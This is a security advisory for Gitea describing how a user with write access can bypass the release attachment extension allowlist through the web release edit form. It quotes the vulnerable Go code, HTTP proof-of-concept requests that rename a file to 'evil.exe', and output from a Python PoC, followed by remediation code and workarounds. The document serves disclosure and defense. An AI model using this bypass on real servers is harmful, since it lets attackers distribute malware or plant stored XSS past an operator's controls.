# [M] Gitea: Release attachment extension allowlist bypass via web release edit form (variant of CVE-2025-68939)

## Summary
Severity: Medium
Advisory: GHSA-25gq-j9jx-43pg
CVE: CVE-2026-58428
CWE: CWE-424, CWE-434
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-25gq-j9jx-43pg
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
## Summary

The web handler `EditReleasePost` (`routers/web/repo/release.go`) reads form fields with prefix `attachment-edit-{uuid}` into a `map[uuid]newName`, passes that map to `release_service.UpdateRelease`, which writes the new name to the database via `repo_model.UpdateAttachmentByUUID` WITHOUT calling `upload.Verify` against `setting.Repository.Release.AllowedTypes`. The parent CVE-2025-68939 fix (PR #32151) added the equivalent `upload.Verify` call on the API edit endpoints via `attachment_service.UpdateAttachment`. The web release edit path was not updated.

A user with repository write permission can rename any existing release attachment to a name with a forbidden extension via the web release edit form, bypassing the operator-configured allowlist.

## Details

### Vulnerable code

`routers/web/repo/release.go:597` `EditReleasePost`:

```go
const editPrefix = "attachment-edit-"
editAttachments := make(map[string]string)
if setting.Attachment.Enabled {
    for k, v := range ctx.Req.Form {
        if strings.HasPrefix(k, editPrefix) {
            editAttachments[k[len(editPrefix):]] = v[0]
        }
    }
}
...
if err = release_service.UpdateRelease(ctx, ctx.Doer, ctx.Repo.GitRepo,
    rel, addAttachmentUUIDs, delAttachmentUUIDs, editAttachments); err != nil {
    ctx.ServerError("UpdateRelease", err)
    return
}
```

`services/release/release.go:321` -- the unvalidated write:

```go
for uuid, newName := range editAttachments {
    if !deletedUUIDs.Contains(uuid) {
        if err = repo_model.UpdateAttachmentByUUID(ctx, &repo_model.Attachment{
            UUID: uuid,
            Name: newName,
        }, "name"); err != nil {
            return err
        }
    }
}
```

No `upload.Verify(nil, newName, setting.Repository.Release.AllowedTypes)` before the database write.

### Comparison: the parent fix on the API path

`routers/api/v1/repo/release_attachment.go:341` (patched in PR #32151):

```go
if err := attachment_service.UpdateAttachment(ctx,
        setting.Repository.Release.AllowedTypes, attach); err != nil {
    if upload.IsErrFileTypeForbidden(err) {
        ctx.Error(http.StatusUnprocessableEntity, "", err)
        return
    }
    ctx.Error(http.StatusInternalServerError, "UpdateAttachment", attach)
    return
}
```

Delegates to:

```go
// services/attachment/attachment.go:96
func UpdateAttachment(ctx context.Context, allowedTypes string, attach *repo_model.Attachment) error {
    if err := upload.Verify(nil, attach.Name, allowedTypes); err != nil {
        return err
    }
    return repo_model.UpdateAttachment(ctx, attach)
}
```

The API path goes through `attachment_service.UpdateAttachment` which calls `upload.Verify(nil, attach.Name, allowedTypes)`. The web path bypasses this entirely.

## Proof of Concept

Tested live against:
* Gitea `v1.26.1` community edition, Linux amd64, SQLite, Go 1.26.2
* `app.ini` includes `[repository.release] ALLOWED_TYPES = .zip,.tar.gz`
* Two users: `admin` (superuser, created via `gitea admin user create --admin`), `bob` (regular, repo owner of `bob/test-repo`)

**Step 1**: bob creates release v0.1 and uploads `innocent.zip` (allowlist compliant) via the API.

**Step 2**: Sanity. The patched API edit endpoint rejects a rename to a forbidden extension.

```http
PATCH /api/v1/repos/bob/test-repo/releases/1/assets/1 HTTP/1.1
Authorization: token <bob_token>
Content-Type: application/json

{"name":"evil.exe"}
```

Response: `HTTP 422` -- "This file cannot be uploaded or modified due to a forbidden file extension or type." (parent CVE-2025-68939 fix in action).

**Step 3**: The attack. The web release edit form does NOT enforce the allowlist.

```http
POST /bob/test-repo/releases/edit/v0.1 HTTP/1.1
Cookie: i_like_gitea=<session>; lang=en-US
Content-Type: application/x-www-form-urlencoded

tag_name=v0.1
&tag_target=main
&title=rename+payload
&content=
&attachment-edit-<existing_attachment_uuid>=evil.exe
```

Response: `HTTP 303 -> /bob/test-repo/releases`. The form is accepted with no validation error.

**Step 4**: Verify.

```http
GET /api/v1/repos/bob/test-repo/releases/1/assets/1 HTTP/1.1
```

Response includes `"name": "evil.exe"`. The download link `/attachments/<uuid>` now serves the file under the forbidden extension.

A self contained Python PoC ships with this advisory: `GITEA-R007_release_edit_extension_bypass.py`. End to end run:

[GITEA-R007_release_edit_extension_bypass.py](https://github.com/user-attachments/files/27739265/GITEA-R007_release_edit_extension_bypass.py)

```
[+] Logged in as bob
[+] Pre-attack attachment name: 'innocent2.zip'
[+] API endpoint correctly rejects rename: HTTP 422 (parent CVE-2025-68939 fix)
[+] POST release edit: HTTP 303 -> /bob/test-repo/releases
[+] Post-attack attachment name: 'pwn.exe'

[!!!] CONFIRMED: web release edit bypasses Release.AllowedTypes allowlist.
```

## Impact

Same impact class as the parent CVE-2025-68939 (HIGH, CVSS 8.2):

* Pre-condition: operator has set `Repository.Release.AllowedTypes` to a non-empty allowlist (a reasonable hardening posture when restricting release uploads).
* Threat actor: user holding repository write permission. In most Gitea deployments this is the repo owner, organization members, or invited collaborators.
* Effect: bypass the allowlist; an attachment uploaded under an allowed extension is renamed to a forbidden extension (.exe, .html, .svg, .js, ...) and served by Gitea under that name.
* Practical impact:
  * Distribute malware files (e.g., `.exe`, `.dmg`, `.msi`, `.apk`) masquerading as a tagged release attachment
  * If Gitea serves attachments with inline rendering (HTML, SVG), the renamed file hosts stored XSS against the Gitea origin
  * Operator hardening intent (the allowlist) is silently defeated, with no audit trail beyond the regular release-edit event

## Suggested remediation

Mirror the parent CVE-2025-68939 fix into the web release edit path. In `services/release/release.go UpdateRelease`, verify each new name against the configured allowlist before persisting:

```go
import (
    "code.gitea.io/gitea/modules/setting"
    "code.gitea.io/gitea/services/context/upload"
)

// inside UpdateRelease, replace the editAttachments loop:
for uuid, newName := range editAttachments {
    if deletedUUIDs.Contains(uuid) {
        continue
    }
    if err := upload.Verify(nil, newName, setting.Repository.Release.AllowedTypes); err != nil {
        return err
    }
    if err = repo_model.UpdateAttachmentByUUID(ctx, &repo_model.Attachment{
        UUID: uuid,
        Name: newName,
    }, "name"); err != nil {
        return err
    }
}
```

The web handler `EditReleasePost` should map `IsErrFileTypeForbidden` to a 422 response (or equivalent flash error and form re-render) to match the API behavior.

Alternative: refactor `attachment_service.UpdateAttachment` to accept a UUID (or expose a `UpdateAttachmentByUUID` variant in the service layer) and have the release service call that instead of the raw model function.

## Workaround for operators (no Gitea change required)

Until a patched release lands, operators can mitigate by either:

1. Removing the `Repository.Release.AllowedTypes` allowlist (accept any extension) -- this eliminates the bypass but also removes the defense, so it is only a holding move.
2. Putting Gitea behind a reverse proxy that rewrites or strips suspicious `attachment-edit-*` form fields on POST to `/<owner>/<repo>/releases/edit/*` -- viable but operationally fragile.
3. Restricting who has Write permission on repositories with a configured release allowlist -- in single-tenant deployments this may be acceptable.

A vendor patch is the right answer; the workarounds above are stopgaps.

## Credit

Jose Rivas (bl4cksku111.com)

## References

* Parent advisory: https://github.com/advisories/GHSA-263q-5cv3-xq9g (CVE-2025-68939)
* Parent fix: PR https://github.com/go-gitea/gitea/pull/32151 (commit `7adc4717ec`)
* CWE-424: https://cwe.mitre.org/data/definitions/424.html
* CWE-434: https://cwe.mitre.org/data/definitions/434.html

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-25gq-j9jx-43pg
- https://github.com/go-gitea/gitea/pull/38406
- https://github.com/go-gitea/gitea/pull/38426
- https://github.com/go-gitea/gitea/commit/de4b8277e9cb576f2315fb03b5ab6478b42a1d31
- https://github.com/go-gitea/gitea/commit/f69e15afe7496cc62e96dab244629c69eb31a7bf
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
